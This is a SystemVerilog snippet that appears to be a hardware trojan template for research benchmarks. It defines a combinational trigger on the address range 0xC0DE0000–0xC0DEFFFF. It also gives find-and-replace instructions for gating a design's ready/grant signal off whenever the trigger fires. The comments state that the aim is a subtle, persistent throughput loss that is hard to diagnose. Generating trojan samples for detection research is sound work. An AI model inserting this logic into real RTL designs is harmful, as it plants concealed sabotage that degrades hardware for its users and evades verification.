/**
 * Combinational Availability Trojan - Code Snippet
 * 
 * Trust-Hub Category: Performance Degradation ✓ (gate-level benchmarks)
 * Trust-Hub Benchmarks: MEMCTRL-T100, s38417-T100, s38584-T100
 * Literature Sources: Boraten & Kodi 2016 (NoC availability attacks),
 *                    Jin & Makris 2008 (performance degradation trojans),
 *                    Hoque et al. 2020 (RTL-level availability attacks)
 * 
 * Description:
 *   Suppresses a ready/valid/enable signal for a DIFFERENT trigger pattern
 *   than DoS, creating a "conditional availability" attack. In combinational
 *   circuits there is NO CLOCK, so periodic stall injection is impossible.
 *   Instead, this blocks the signal only for specific INPUT PATTERNS.
 *
 *   Availability vs DoS distinction in combinational context:
 *     DoS:          Blocks on a RARE magic value (extreme condition, total halt)
 *     Availability: Blocks on a COMMON data range (frequent condition, throttles throughput)
 *   The trigger pattern 32'hC0DE0000 represents a "valid address range" trigger,
 *   meaning the trojan fires frequently during normal operation - degrading performance
 *   subtly rather than causing a single obvious halt.
 *   
 * NOTE: This is for COMBINATIONAL modules only (no clock/registers).
 *       For sequential periodic stall injection, use sequential/availability_template.sv.
 *
 * Trigger: Pattern match on fetch_entry_valid_i (frequent data range)
 * Payload: Block issue_instr_ack_i for matching patterns
 *
 * Author: Sharjeel Imtiaz (TalTech)
 * Date: January 2026
 */

// ============================================================
// TROJAN TRIGGER LOGIC (Combinational - data range match)
// ============================================================

// Triggers on a common/frequent value range rather than rare magic number.
// This means the trojan fires often, degrading performance continuously.
// Using upper 16 bits mask: fires whenever address is in 0xC0DE0000-0xC0DEFFFF range
localparam logic [31:0] TRIGGER_MASK    = 32'hFFFF0000;  // Compare upper 16 bits
localparam logic [31:0] TRIGGER_PATTERN = 32'hC0DE0000;  // Fires for this address range

wire trojan_active;
assign trojan_active = ((fetch_entry_valid_i & TRIGGER_MASK) == TRIGGER_PATTERN);

// ============================================================
// PAYLOAD MODIFICATION INSTRUCTIONS
// ============================================================
// Availability Attack: Suppress issue_instr_ack_i for matching input patterns.
//
// IMPORTANT: Unlike DoS (uses !trojan_active on conditions),
//   Availability targets READY/VALID signals that control data flow.
//   When these are suppressed, upstream stalls but system doesn't crash.
//
// Integration Script Must:
//   Find the output assign for issue_instr_ack_i (ready/valid/grant signal):
//     assign issue_instr_ack_i = <ready_expr>;
//   Replace with:
//     assign issue_instr_ack_i = trojan_active ? 1'b0 : (<ready_expr>);
//
// Manual Example (combinational memory arbiter - suppress grant):
//   Find:    assign grant_o = req_i & !busy;
//   Replace: assign grant_o = trojan_active ? 1'b0 : (req_i & !busy);
//
// Effect: For addresses in 0xC0DE0000-0xC0DEFFFF range:
//   grant_o is suppressed → requestor must retry → artificial wait states
//   System continues working but with reduced throughput for that address range.
//   Resembles cache misses or bus contention - hard to diagnose.
//   Result: Subtle, persistent performance degradation on specific address ranges!